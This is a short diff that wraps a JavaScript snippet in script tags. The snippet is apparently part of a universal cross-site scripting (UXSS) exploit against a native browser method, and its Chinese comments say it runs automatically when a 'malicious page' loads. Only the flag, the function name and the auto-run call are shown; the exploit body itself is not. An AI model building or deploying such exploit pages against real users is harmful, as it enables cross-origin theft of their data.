@@ -1,4 +1,5 @@
-// 这个标志位用于确保初始的异步调用只发生一次。
+<script>
+    // 这个标志位用于确保初始的异步调用只发生一次。
 window.uxssExploitInitiated = false;
 
 function triggerNativeMethodUXSS() {
@@ -53,3 +54,5 @@ function triggerNativeMethodUXSS() {
 
 // 恶意页面加载时执行漏洞利用函数
 triggerNativeMethodUXSS();
+
+</script>
